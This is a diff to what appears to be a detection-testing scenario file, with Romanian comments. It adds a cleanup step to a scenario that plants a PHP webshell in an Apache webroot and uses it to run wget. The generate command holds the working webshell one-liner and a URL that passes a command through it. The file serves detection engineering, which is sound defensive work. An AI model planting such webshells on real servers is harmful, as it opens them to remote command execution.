@@ -63,8 +63,12 @@ scenarios:
 - name: Download payload — webshell lanseaza wget
   path: hunt
   ground_truth: attack
+  # wget ruleaza din webroot (cwd-ul webshell-ului) si salveaza pagina ca index.html[.N], pe care
+  # Apache o serveste inaintea WordPress. Curatenie: doar fisierele index.html* scrise de www-data
+  # dupa h.php (adica de aceasta rulare). Comanda vazuta de detectie ramane aceeasi.
   generate: printf "%s" "<?php system(\$_GET[\"c\"]); ?>" | sudo tee /var/www/html/h.php
     >/dev/null && curl -s "http://localhost/h.php?c=wget+-q+http://127.0.0.1/" >/dev/null
+    && sudo find /var/www/html -maxdepth 1 -name "index.html*" -user www-data -newer /var/www/html/h.php -delete
     && sudo rm /var/www/html/h.php
   finding:
     host: web-prod
